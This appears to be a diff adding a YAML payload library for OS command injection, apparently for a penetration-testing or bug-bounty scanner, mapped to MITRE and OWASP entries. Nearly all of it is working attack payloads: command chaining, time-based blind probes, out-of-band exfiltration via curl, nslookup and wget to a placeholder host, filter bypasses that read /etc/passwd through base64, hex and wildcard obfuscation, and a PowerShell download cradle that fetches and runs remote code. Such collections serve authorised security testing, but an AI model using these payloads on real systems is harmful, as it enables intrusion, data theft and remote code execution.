@@ -1,0 +1,307 @@
+id: command_injection
+name: OS Command Injection
+version: 1.0.0
+category: injection
+description: |
+  Payloads for OS command injection in web parameters, file names, and headers
+  that flow into shell exec primitives. Covers in-band, blind/time-based, and
+  filter-bypass variants for *nix and Windows targets.
+mitre:
+  - T1190
+  - T1059
+  - T1059.004
+owasp_top10:
+  - A03:2021
+references:
+  - https://owasp.org/www-community/attacks/Command_Injection
+  - https://portswigger.net/web-security/os-command-injection
+  - https://book.hacktricks.xyz/pentesting-web/command-injection
+  - https://github.com/payloadbox/command-injection-payload-list
+related_tools:
+  - commix
+  - nuclei
+  - ffuf
+  - dalfox
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: basic_semicolon_id
+    name: Basic semicolon chain to id
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [linux, php, node]
+    severity_when_works: critical
+    payload: |
+      ; id
+    notes: null
+    source: common knowledge
+  - id: pipe_id
+    name: Pipe to id
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: critical
+    payload: |
+      | id
+    notes: null
+    source: common knowledge
+  - id: backticks_id
+    name: Backtick command substitution
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [linux, bash]
+    severity_when_works: critical
+    payload: |
+      `id`
+    notes: null
+    source: common knowledge
+  - id: dollar_paren_id
+    name: Dollar-paren command substitution
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [linux, bash]
+    severity_when_works: critical
+    payload: |
+      $(id)
+    notes: null
+    source: common knowledge
+  - id: and_id
+    name: Logical AND chain
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [linux, windows]
+    severity_when_works: critical
+    payload: |
+      && id
+    notes: null
+    source: common knowledge
+  - id: or_id
+    name: Logical OR chain
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [linux, windows]
+    severity_when_works: critical
+    payload: |
+      || id
+    notes: null
+    source: common knowledge
+  - id: newline_id
+    name: Newline injection
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: critical
+    payload: "%0aid"
+    notes: URL-encode the newline when needed
+    source: common knowledge
+  - id: windows_amp_whoami
+    name: Windows ampersand chain
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [windows]
+    severity_when_works: critical
+    payload: |
+      & whoami
+    notes: null
+    source: common knowledge
+  - id: windows_pipe_dir
+    name: Windows pipe to dir
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [windows]
+    severity_when_works: critical
+    payload: |
+      | dir
+    notes: null
+    source: common knowledge
+  - id: blind_sleep_unix
+    name: Blind time-based sleep
+    subcategory: blind
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: critical
+    payload: |
+      ; sleep 10
+    notes: Detect by response delay
+    source: common knowledge
+  - id: blind_sleep_dollar
+    name: Blind sleep via $()
+    subcategory: blind
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: critical
+    payload: |
+      $(sleep 10)
+    notes: null
+    source: common knowledge
+  - id: blind_ping
+    name: Blind ping for time delay
+    subcategory: blind
+    encoding: raw
+    tech_targets: [linux, windows]
+    severity_when_works: critical
+    payload: |
+      & ping -n 10 127.0.0.1
+    notes: Works on Windows; use -c on Linux
+    source: common knowledge
+  - id: oob_curl_burp
+    name: Out-of-band curl to collaborator
+    subcategory: oob
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: critical
+    payload: |
+      ; curl http://OOB.example.net/$(whoami)
+    notes: Replace OOB.example.net with a Burp/Interactsh host
+    source: https://portswigger.net/burp/documentation/collaborator
+  - id: oob_dns_nslookup
+    name: OOB DNS exfil via nslookup
+    subcategory: oob
+    encoding: raw
+    tech_targets: [linux, windows]
+    severity_when_works: critical
+    payload: |
+      ; nslookup $(whoami).OOB.example.net
+    notes: null
+    source: common knowledge
+  - id: oob_wget
+    name: OOB wget pingback
+    subcategory: oob
+    encoding: raw
+    tech_targets: [linux]
+    severity_when_works: critical
+    payload: |
+      | wget http://OOB.example.net/x
+    notes: null
+    source: common knowledge
+  - id: bypass_ifs
+    name: IFS variable separator bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [linux, bash]
+    severity_when_works: high
+    payload: |
+      ;cat${IFS}/etc/passwd
+    notes: Bypasses simple space-stripping filters
+    source: https://book.hacktricks.xyz/pentesting-web/command-injection
+  - id: bypass_brace_expansion
+    name: Brace expansion bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [linux, bash]
+    severity_when_works: high
+    payload: |
+      ;{cat,/etc/passwd}
+    notes: null
+    source: https://book.hacktricks.xyz/pentesting-web/command-injection
+  - id: bypass_quotes
+    name: Quote-splitting bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [linux, bash]
+    severity_when_works: high
+    payload: |
+      ;c"a"t /etc/pa''sswd
+    notes: Breaks keyword-blacklist filters
+    source: common knowledge
+  - id: bypass_base64_decode
+    name: Base64-decoded execution
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [linux, bash]
+    severity_when_works: high
+    payload: |
+      ;`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`
+    notes: cat /etc/passwd via base64
+    source: common knowledge
+  - id: bypass_hex
+    name: Hex-decoded execution
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [linux, bash]
+    severity_when_works: high
+    payload: |
+      ;`echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+    notes: null
+    source: common knowledge
+  - id: bypass_wildcard
+    name: Wildcard binary path
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [linux, bash]
+    severity_when_works: high
+    payload: |
+      ;/???/c?t /???/p??swd
+    notes: Wildcards evade /bin/cat keyword filters
+    source: https://book.hacktricks.xyz/pentesting-web/command-injection
+  - id: url_encoded_semicolon_id
+    name: URL-encoded semicolon
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [linux]
+    severity_when_works: critical
+    payload: |
+      %3Bid
+    notes: null
+    source: common knowledge
+  - id: double_url_encoded
+    name: Double URL-encoded chain
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [linux]
+    severity_when_works: high
+    payload: |
+      %253B%2520id
+    notes: For WAFs that decode once
+    source: common knowledge
+  - id: php_passthru
+    name: PHP passthru attempt
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: |
+      ;passthru('id');
+    notes: When parameter ends up in eval()
+    source: https://owasp.org/www-community/attacks/Command_Injection
+  - id: node_child_process
+    name: Node child_process injection
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [node]
+    severity_when_works: critical
+    payload: |
+      ; require('child_process').exec('id')
+    notes: When parameter flows into eval/Function
+    source: common knowledge
+  - id: powershell_iex
+    name: PowerShell IEX download cradle
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [windows, powershell]
+    severity_when_works: critical
+    payload: |
+      ;powershell -nop -c "iex(iwr http://OOB.example.net/x)"
+    notes: null
+    source: common knowledge
+  - id: crlf_inject_cmd
+    name: CRLF + command
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [linux]
+    severity_when_works: critical
+    payload: |
+      %0d%0aid
+    notes: null
+    source: common knowledge
+  - id: subshell_eval
+    name: Subshell eval wrapper
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [linux, bash]
+    severity_when_works: critical
+    payload: |
+      ;$(eval `echo aWQ=|base64 -d`)
+    notes: null
+    source: common knowledge
